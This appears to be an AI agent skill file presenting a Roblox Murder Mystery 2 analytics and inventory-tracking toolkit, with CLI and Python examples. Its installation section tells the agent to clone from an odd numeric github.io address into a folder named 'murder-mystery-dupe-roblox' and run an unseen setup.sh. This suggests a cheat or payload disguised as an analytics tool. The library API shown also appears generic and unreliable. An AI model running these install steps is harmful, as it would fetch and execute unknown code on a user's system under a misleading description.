---
name: mm2-analytics-roblox-toolkit
description: Roblox Murder Mystery 2 analytics dashboard and inventory tracking toolkit with data visualization and strategy analysis
triggers:
  - how do I use the MM2 analytics dashboard
  - set up Murder Mystery 2 inventory tracker
  - analyze my Roblox MM2 knife collection
  - configure MM2 stats tracking
  - export Murder Mystery 2 gameplay data
  - track my MM2 gamepass statistics
  - optimize my Murder Mystery 2 strategy with data
  - visualize my Roblox MM2 performance metrics
---

# MM2 Analytics Roblox Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This skill enables AI agents to help developers use the Murder Mystery 2 Analytics Dashboard, a comprehensive toolkit for tracking inventory, analyzing gameplay statistics, and optimizing strategy in Roblox's Murder Mystery 2 game through data visualization and AI-powered insights.

## What This Project Does

The MM2 Analytics Dashboard is a data analysis and visualization toolkit that provides:

- **Inventory Management**: Track knife skins, gamepasses, and collection completeness
- **Performance Analytics**: Monitor win/loss ratios, role-specific statistics, and gameplay patterns
- **Strategy Optimization**: AI-powered pattern recognition and predictive modeling
- **Data Visualization**: Interactive charts and dashboards for stats tracking
- **Export Tools**: Generate reports in CSV, JSON formats for external analysis

## Installation

### Quick Install (Automated)

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Run automated setup
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt
```

### Dependencies

The project requires:
- Python 3.8+ with packages: `pandas`, `numpy`, `matplotlib`, `pyyaml`, `requests`
- Node.js 18+ with packages for web dashboard
- Optional: OpenAI/Claude API keys for AI features

## Configuration

### Environment Setup

Create a `.env` file in the project root:

```bash
# API Keys (optional for AI features)
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data directories
DATA_DIRECTORY=./data/collections
EXPORT_DIRECTORY=./exports

# Analytics settings
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true
LOG_LEVEL=INFO

# Roblox connection (local data only)
ROBLOX_USER_ID=your_user_id
```

### Profile Configuration

Create a profile in `config/profiles.yaml`:

```yaml
profiles:
  - name: "default_profile"
    username: "MysterySolver2026"
    settings:
      preferred_role: "sheriff"
      tracking_mode: "comprehensive"
      data_refresh_rate: 30
      export_format: ["csv", "json"]
    
    inventory_filter:
      knife_skins:
        rarity: ["legendary", "ancient", "godly"]
        track_duplicates: true
      gamepasses:
        active_only: true
    
    analytics_preferences:
      win_loss_tracking: true
      role_performance: true
      time_analysis: true
      prediction_models: false
    
    strategy_templates:
      - name: "aggressive_sheriff"
        priority: "high_visibility_areas"
        confidence: 0.85
      - name: "passive_innocent"
        priority: "distraction_avoidance"
        confidence: 0.72
```

## Key Commands (CLI)

### Analytics Mode

Run comprehensive analytics on your gameplay data:

```bash
# Basic analytics
python3 main.py --mode analytics --profile default_profile

# With export
python3 main.py --mode analytics \
  --profile default_profile \
  --export statistics_2026.json \
  --format json \
  --verbose

# Live tracking mode
python3 main.py --mode analytics \
  --profile default_profile \
  --live \
  --interval 60

# Debug mode
python3 main.py --mode analytics \
  --profile default_profile \
  --log-level DEBUG \
  --verbose
```

### Inventory Management

Track and analyze your item collection:

```bash
# Scan inventory
python3 main.py --mode inventory \
  --scan \
  --profile default_profile

# Filter by rarity
python3 main.py --mode inventory \
  --filter rarity:legendary,ancient \
  --export inventory_rare.csv

# Check collection completeness
python3 main.py --mode inventory \
  --check-completeness \
  --category knife_skins

# Find duplicates
python3 main.py --mode inventory \
  --find-duplicates \
  --export duplicates_report.json
```

### Strategy Analysis

Analyze gameplay patterns and optimize strategy:

```bash
# Analyze win patterns
python3 main.py --mode strategy \
  --analyze-patterns \
  --role sheriff \
  --export patterns.json

# Generate recommendations
python3 main.py --mode strategy \
  --recommend \
  --based-on last_30_days

# Compare strategies
python3 main.py --mode strategy \
  --compare aggressive_sheriff,passive_innocent \
  --metrics win_rate,survival_time
```

### Data Export

Export data for external analysis:

```bash
# Export all statistics
python3 main.py --export-all \
  --format csv \
  --output ./exports/full_export_2026.csv

# Export specific metrics
python3 main.py --export \
  --metrics win_loss,inventory,strategy \
  --format json \
  --output ./exports/metrics.json

# Export for visualization
python3 main.py --export \
  --format visualization \
  --charts win_rate,role_distribution,inventory_rarity \
  --output ./exports/viz_data.json
```

## Python API Usage

### Inventory Tracker

```python
from mm2_toolkit import InventoryManager, InventoryFilter

# Initialize inventory manager
manager = InventoryManager(
    profile_name="default_profile",
    data_directory="./data/collections"
)

# Load current inventory
manager.load_inventory()

# Filter knife skins by rarity
filter_config = InventoryFilter(
    category="knife_skins",
    rarity=["legendary", "ancient"],
    include_duplicates=False
)

filtered_items = manager.filter_items(filter_config)

# Get collection statistics
stats = manager.get_statistics()
print(f"Total items: {stats['total_count']}")
print(f"Unique knives: {stats['unique_knife_count']}")
print(f"Collection completeness: {stats['completeness_percentage']}%")

# Export inventory
manager.export(
    format="json",
    output_path="./exports/inventory_export.json",
    include_metadata=True
)
```

### Analytics Engine

```python
from mm2_toolkit import AnalyticsEngine, AnalyticsConfig

# Configure analytics
config = AnalyticsConfig(
    tracking_mode="comprehensive",
    refresh_rate=30,
    enable_predictions=True,
    api_key_openai="${OPENAI_API_KEY}"
)

# Initialize engine
engine = AnalyticsEngine(config)

# Load gameplay data
engine.load_data(
    source="local",
    profile="default_profile",
    date_range="last_30_days"
)

# Calculate performance metrics
metrics = engine.calculate_metrics()
print(f"Win rate: {metrics['win_rate']:.2%}")
print(f"Average survival time: {metrics['avg_survival_seconds']}s")
print(f"Sheriff accuracy: {metrics['sheriff_accuracy']:.2%}")

# Generate win/loss breakdown by role
role_breakdown = engine.breakdown_by_role()
for role, stats in role_breakdown.items():
    print(f"{role}: {stats['wins']}W / {stats['losses']}L")

# Get AI-powered insights (requires API key)
if config.enable_predictions:
    insights = engine.generate_insights()
    for insight in insights:
        print(f"- {insight['recommendation']}")
```

### Strategy Analyzer

```python
from mm2_toolkit import StrategyAnalyzer, StrategyPattern

# Initialize analyzer
analyzer = StrategyAnalyzer(profile="default_profile")

# Define strategy pattern
aggressive_pattern = StrategyPattern(
    name="aggressive_sheriff",
    role="sheriff",
    priorities=[
        "high_visibility_areas",
        "rapid_elimination",
        "coin_collection_secondary"
    ],
    risk_tolerance=0.8
)

# Analyze pattern effectiveness
results = analyzer.analyze_pattern(
    pattern=aggressive_pattern,
    sample_size=100
)

print(f"Pattern win rate: {results['win_rate']:.2%}")
print(f"Average time to victory: {results['avg_time_to_win']}s")
print(f"Confidence score: {results['confidence']:.2f}")

# Compare multiple strategies
passive_pattern = StrategyPattern(
    name="passive_innocent",
    role="innocent",
    priorities=[
        "stealth_movement",
        "coin_avoidance",
        "survival_focus"
    ],
    risk_tolerance=0.3
)

comparison = analyzer.compare_strategies([
    aggressive_pattern,
    passive_pattern
])

for result in comparison:
    print(f"{result['name']}: {result['effectiveness_score']:.2f}")
```

### Data Visualization

```python
from mm2_toolkit import DataVisualizer, ChartConfig

# Initialize visualizer
visualizer = DataVisualizer(
    theme="dark",
    resolution=(1920, 1080)
)

# Load data
visualizer.load_data(source="analytics_engine")

# Create win rate chart
win_chart = visualizer.create_chart(
    chart_type="line",
    data_field="win_rate",
    config=ChartConfig(
        title="Win Rate Over Time",
        x_axis="date",
        y_axis="percentage",
        color_scheme="gradient_blue"
    )
)

win_chart.save("./exports/win_rate_chart.png")

# Create inventory distribution pie chart
inventory_chart = visualizer.create_chart(
    chart_type="pie",
    data_field="inventory_rarity",
    config=ChartConfig(
        title="Knife Rarity Distribution",
        labels=["Common", "Uncommon", "Rare", "Legendary", "Ancient"],
        color_scheme="rarity_colors"
    )
)

inventory_chart.save("./exports/inventory_distribution.png")

# Generate dashboard
dashboard = visualizer.create_dashboard(
    charts=[
        "win_rate_timeline",
        "role_performance",
        "inventory_value",
        "strategy_effectiveness"
    ],
    layout="2x2_grid"
)

dashboard.export("./exports/dashboard.html")
```

## Common Patterns

### Full Analytics Workflow

```python
from mm2_toolkit import (
    ProfileManager,
    InventoryManager,
    AnalyticsEngine,
    StrategyAnalyzer,
    DataVisualizer
)

# Load profile
profile = ProfileManager.load("default_profile")

# Step 1: Scan inventory
inventory = InventoryManager(profile)
inventory.scan()
inventory_stats = inventory.get_statistics()

# Step 2: Analyze gameplay
analytics = AnalyticsEngine(profile.analytics_config)
analytics.load_data(date_range="last_7_days")
performance = analytics.calculate_metrics()

# Step 3: Evaluate strategies
strategy = StrategyAnalyzer(profile)
strategy_results = strategy.analyze_all_patterns()

# Step 4: Generate visualizations
visualizer = DataVisualizer()
visualizer.load_data_from_sources([
    inventory,
    analytics,
    strategy
])

# Create comprehensive report
report = {
    "profile": profile.username,
    "generated_at": datetime.now().isoformat(),
    "inventory": inventory_stats,
    "performance": performance,
    "strategies": strategy_results
}

# Export everything
with open("./exports/full_report.json", "w") as f:
    json.dump(report, f, indent=2)

visualizer.create_dashboard(
    charts=["all"],
    layout="auto"
).export("./exports/dashboard.html")

print("Complete analytics workflow finished!")
```

### Real-time Monitoring

```python
from mm2_toolkit import LiveTracker
import time

# Initialize live tracker
tracker = LiveTracker(
    profile="default_profile",
    refresh_interval=30
)

# Start monitoring
tracker.start()

try:
    while True:
        # Get current session stats
        current_stats = tracker.get_current_session()
        
        print(f"Session time: {current_stats['duration_minutes']}m")
        print(f"Games played: {current_stats['games_played']}")
        print(f"Current win rate: {current_stats['session_win_rate']:.2%}")
        
        # Check for significant events
        events = tracker.get_recent_events()
        for event in events:
            if event['type'] == 'rare_item_obtained':
                print(f"🎉 Rare item obtained: {event['item_name']}")
            elif event['type'] == 'win_streak':
                print(f"🔥 Win streak: {event['streak_length']} games!")
        
        time.sleep(tracker.refresh_interval)

except KeyboardInterrupt:
    # Save session data
    tracker.stop()
    session_summary = tracker.export_session()
    print(f"\nSession saved: {session_summary['filename']}")
```

### Custom Data Export

```python
from mm2_toolkit import DataExporter, ExportFormat
import pandas as pd

# Initialize exporter
exporter = DataExporter(profile="default_profile")

# Define custom export schema
schema = {
    "inventory": {
        "fields": ["item_name", "rarity", "category", "obtained_date"],
        "filter": {"rarity": ["legendary", "ancient"]}
    },
    "gameplay": {
        "fields": ["date", "role", "outcome", "duration_seconds"],
        "date_range": "last_30_days"
    },
    "strategy": {
        "fields": ["pattern_name", "win_rate", "games_played"],
        "min_games": 10
    }
}

# Export to DataFrame for analysis
data = exporter.export_custom(schema, format=ExportFormat.DATAFRAME)

# Perform custom analysis
inventory_df = data['inventory']
gameplay_df = data['gameplay']

# Calculate custom metrics
rare_items_count = len(inventory_df)
sheriff_win_rate = (
    gameplay_df[gameplay_df['role'] == 'sheriff']['outcome'] == 'win'
).mean()

print(f"Rare items owned: {rare_items_count}")
print(f"Sheriff win rate: {sheriff_win_rate:.2%}")

# Export combined report
combined_df = pd.merge(
    gameplay_df,
    inventory_df,
    how='outer',
    left_index=True,
    right_index=True
)

combined_df.to_csv("./exports/combined_analysis.csv", index=False)
```

## Troubleshooting

### Common Issues

**Issue: "Profile not found" error**
```bash
# Verify profile exists
python3 main.py --list-profiles

# Create new profile
python3 main.py --create-profile my_profile
```

**Issue: "No data to analyze" error**
```python
# Check data directory
from mm2_toolkit import DataValidator

validator = DataValidator()
status = validator.check_data_availability(profile="default_profile")

if not status['has_data']:
    print("Data directory is empty. Run inventory scan first:")
    print("python3 main.py --mode inventory --scan")
```

**Issue: API key errors with AI features**
```python
# Verify environment variables
import os

openai_key = os.getenv('OPENAI_API_KEY')
if not openai_key:
    print("Warning: OPENAI_API_KEY not set. AI features disabled.")
    
# Disable AI features in config
config.enable_predictions = False
```

**Issue: Export format not supported**
```python
from mm2_toolkit import DataExporter, ExportFormat

# Check supported formats
supported = ExportFormat.list_supported()
print(f"Supported formats: {supported}")

# Use correct format
exporter.export(
    format=ExportFormat.JSON,  # Use enum
    output_path="./exports/data.json"
)
```

**Issue: Slow analytics performance**
```python
# Enable caching
config = AnalyticsConfig(
    enable_cache=True,
    cache_ttl=3600,  # 1 hour
    parallel_processing=True
)

# Use incremental updates
analytics.load_data(
    mode="incremental",  # Only load new data
    since="last_session"
)
```

## Best Practices

1. **Always use environment variables** for API keys and sensitive data
2. **Run inventory scans regularly** to keep data up-to-date
3. **Use profile-specific configurations** for different play styles
4. **Enable caching** for large datasets to improve performance
5. **Export data frequently** to prevent data loss
6. **Validate data integrity** before running analytics

## Additional Resources

- Configuration examples: `config/examples/`
- Sample data: `data/samples/`
- API documentation: `docs/api.md`
- Strategy guides: `docs/strategies.md`
